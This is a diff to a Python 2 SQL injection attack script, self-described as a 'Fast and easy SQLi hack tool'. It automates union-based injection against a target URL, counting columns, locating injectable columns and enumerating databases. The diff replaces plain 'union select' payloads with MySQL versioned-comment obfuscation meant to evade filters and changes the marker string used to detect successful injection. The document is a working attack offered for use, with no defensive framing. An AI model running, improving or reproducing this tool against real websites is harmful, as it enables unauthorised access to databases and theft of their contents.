@@ -7,8 +7,6 @@ import sys
 import os
 import platform
 
-debug = 0
-
 clear = "clear"
 if platform.system() == "Windows":
     clear = "cls"
@@ -20,7 +18,7 @@ _____ _              ___      _                     _____
   / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
  / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
  \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
-                         |___/                                                 Beta 2.0
+                         |___/                                                 Beta 2.1
 More: https://www.facebook.com/TheCybersTeam"
 Fast and easy SQLi hack tool"
 """
@@ -31,7 +29,7 @@ class Sqli:
     columns = None
     dbs = []
     build = ["", ""]
-    key = "0x5468334379623372735433346d"
+    key = "1620597971540027"
     def setUrl(self):
         for k, v in enumerate(sys.argv):
             if v == "--url":
@@ -59,7 +57,7 @@ class Sqli:
 
     def setColumns(self):
         print "Start Count Columns..."
-        url = self.url + "0x2d31+union+select+"
+        url = self.url + "0x2d31+/*!50000UNION*//*!50000SELECT*/"
         start = 1
         finish = 50
         for i in range(start,finish):
@@ -69,14 +67,14 @@ class Sqli:
             url+=self.key
             res = self.getContent(url)
             if res.find("union select") ==-1:
-                if res.find("Th3Cyb3rsT34m") !=-1:
+                if res.find("1620597971540027") !=-1:
                     self.columns = i
                     return    
         self.columns = 0
 
     def setVulCol(self):
         for i in range(1, self.columns+1):
-            line = "0x2d31+union+select+"
+            line = "0x2d31+/*!50000UNION*//*!50000SELECT*/"
             for j in range(1, self.columns+1):
                 if j != 1 and j != self.columns+1:
                     line = line + ", "
@@ -105,7 +103,7 @@ class Sqli:
                 exit()
 
     def getDatabase(self):
-        self.build = [self.url + "0x2d31+union+select+", ""]
+        self.build = [self.url + "0x2d31+/*!50000UNION*//*!50000SELECT*/", ""]
         line = ""
         side = 0
         for i in range(1, self.columns+1):
